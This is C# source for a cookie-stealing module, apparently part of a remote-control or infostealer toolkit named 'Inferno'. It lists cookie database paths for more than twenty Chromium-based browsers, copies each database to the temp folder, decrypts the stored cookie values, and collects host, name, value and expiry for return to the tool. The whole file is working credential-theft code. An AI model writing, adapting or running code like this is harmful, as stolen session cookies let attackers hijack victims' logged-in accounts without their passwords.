﻿using System;
using System.Collections.Generic;
using System.IO;

namespace Inferno
{
    internal class Cookies
    {
        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();

        // Return list with arrays (value, hostKey, name, path, expires, isSecure)
        public static void get()
        {
            // Path info
            string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
            string u_s = "\\User Data\\Default\\Cookies";
            // Browsers list
            string[] chromiumBasedBrowsers = new string[]
            {
                l_a + "Google\\Chrome" + u_s,
                l_a + "Google(x86)\\Chrome" + u_s,
                l_a + "Chromium" + u_s,
                a_a + "Opera Software\\Opera Stable\\Cookies",
                l_a + "BraveSoftware\\Brave-Browser" + u_s,
                l_a + "Epic Privacy Browser" + u_s,
                l_a + "Amigo" + u_s,
                l_a + "Vivaldi" + u_s,
                l_a + "Orbitum" + u_s,
                l_a + "Mail.Ru\\Atom" + u_s,
                l_a + "Kometa" + u_s,
                l_a + "Comodo\\Dragon" + u_s,
                l_a + "Torch" + u_s,
                l_a + "Comodo" + u_s,
                l_a + "Slimjet" + u_s,
                l_a + "360Browser\\Browser" + u_s,
                l_a + "Maxthon3" + u_s,
                l_a + "K-Melon" + u_s,
                l_a + "Sputnik\\Sputnik" + u_s,
                l_a + "Nichrome" + u_s,
                l_a + "CocCoc\\Browser" + u_s,
                l_a + "uCozMedia\\Uran" + u_s,
                l_a + "Chromodo" + u_s,
                l_a + "Yandex\\YandexBrowser" + u_s
            };

            List<Dictionary<string, string>> cookies = new List<Dictionary<string, string>>();
            // Database
            string tempCookieLocation = "";

            // Search all browsers
            foreach (string browser in chromiumBasedBrowsers)
            {
                if (File.Exists(browser))
                {
                    tempCookieLocation = Environment.GetEnvironmentVariable("temp") + "\\browserCookies";
                    if (File.Exists(tempCookieLocation))
                    {
                        File.Delete(tempCookieLocation);
                    }
                    File.Copy(browser, tempCookieLocation);
                }
                else
                {
                    continue;
                }

                // Read chrome database
                cSQLite sSQLite = new cSQLite(tempCookieLocation);
                sSQLite.ReadTable("cookies");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    // Get data from database
                    string value = sSQLite.GetValue(i, 12);
                    string hostKey = sSQLite.GetValue(i, 1);
                    string name = sSQLite.GetValue(i, 2);
                    string path = sSQLite.GetValue(i, 4);
                    string expires = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(sSQLite.GetValue(i, 5))), TimeZoneInfo.Local));
                    string isSecure = sSQLite.GetValue(i, 6).ToUpper();

                
                    // If no data => break
                    if (string.IsNullOrEmpty(name))
                    {
                        break;
                    }

                    Dictionary<string, string> credentials = new Dictionary<string, string>
                    {
                        ["value"] = Crypt.toUTF8(Crypt.decryptChrome(value, browser)),
                        ["hostKey"] = hostKey,
                        ["name"] = Crypt.toUTF8(name),
                        ["path"] = path,
                        ["expires"] = expires,
                        ["isSecure"] = isSecure
                    };
                    cookies.Add(credentials);
                    continue;
                }
                continue;
            }

            output.cookies = cookies;
            core.Exit("Browsers cookies received", output);
        }
    }
}
